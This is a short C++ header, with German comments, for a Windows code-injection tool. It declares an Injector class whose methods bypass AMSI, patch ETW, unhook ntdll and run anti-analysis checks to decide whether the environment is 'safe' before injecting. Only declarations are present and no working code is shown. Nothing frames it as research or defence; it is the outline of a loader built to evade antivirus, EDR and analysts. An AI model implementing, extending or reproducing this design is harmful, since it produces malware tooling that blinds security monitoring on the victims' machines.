#ifndef INJECTOR_H
#define INJECTOR_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <vector>

// Hauptklasse, die den Injektionsprozess orchesstriert.
class Injector {
public:
    Injector();
    ~Injector();
    void run();

    // Führt die Bypässe und Anti-Analyse-Prüfungen aus.
    // Gibt true zurück, wenn die Umgebung als sicher eingestuft wird.
    bool prepareEnvironment();

private:
    bool bypassAMSI();
    bool patchETW();
    bool checkAntiAnalysis();
    HANDLE unhookNtdll();
    void releaseNtdll(HANDLE hNtdll);
};

#endif // INJECTOR_H 